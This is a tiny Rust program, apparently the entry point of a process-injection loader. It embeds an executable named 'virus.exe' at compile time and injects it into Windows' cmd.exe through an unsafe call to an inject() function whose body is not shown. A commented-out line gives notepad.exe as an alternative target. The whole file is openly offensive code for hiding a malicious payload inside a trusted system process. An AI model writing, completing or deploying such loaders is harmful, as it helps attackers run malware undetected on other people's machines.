use crate::injection::inject;

mod injection;

fn main() {
    unsafe{
        // C:\Windows\System32\notepad.exe
        inject(r"C:\Windows\System32\cmd.exe", include_bytes!(r"C:\Users\me\Desktop\virus.exe"));
    }
}
